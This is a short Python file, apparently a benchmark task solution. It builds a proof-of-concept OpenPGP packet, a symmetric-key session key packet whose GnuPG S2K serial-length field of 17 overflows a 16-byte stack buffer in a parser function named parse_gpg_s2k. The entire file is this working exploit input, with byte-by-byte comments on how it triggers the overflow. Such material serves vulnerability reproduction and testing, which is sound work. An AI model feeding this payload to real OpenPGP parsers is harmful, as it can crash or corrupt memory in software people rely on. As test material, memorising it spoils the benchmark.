import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Stack Buffer Overflow in parse_gpg_s2k.
        The vulnerability exists in the handling of GnuPG S2K extension (mode 101).
        Specifically, the 'divert to card with serial' mode (type 2) reads a 1-byte length
        field for the serial number and copies that many bytes into a fixed-size 16-byte stack buffer.
        Providing a length > 16 triggers the overflow.
        """
        # Construct a Tag 3 (Symmetric-Key Encrypted Session Key Packet)
        # Header: 0x8C (Tag 3, length type 0 - 1 byte length)
        # Packet Length: 25 bytes (0x19)
        # Payload breakdown:
        #   Version: 0x04 (1 byte)
        #   Cipher: 0x09 (AES256) (1 byte)
        #   S2K Specifier:
        #     Mode: 0x65 (101 - GnuPG Extension) (1 byte)
        #     Magic: "GNU" (3 bytes)
        #     Protection Mode: 0x02 (Divert to card with serial) (1 byte)
        #     Serial Length: 0x11 (17) (1 byte) -> Triggers overflow (17 > 16)
        #     Serial Number: 17 bytes of padding (17 bytes)
        # Total Payload: 1 + 1 + 1 + 3 + 1 + 1 + 17 = 25 bytes
        # Total PoC: 2 (Header) + 25 (Payload) = 27 bytes
        
        poc = (
            b'\x8c\x19'             # Tag 3, Length 25
            b'\x04'                 # Version 4
            b'\x09'                 # Cipher AES256
            b'\x65'                 # S2K Mode 101 (GnuPG)
            b'GNU'                  # Magic
            b'\x02'                 # Protection Mode 2 (Divert with serial)
            b'\x11'                 # Serial Length 17
            b'A' * 17               # Serial Data
        )
        
        return poc
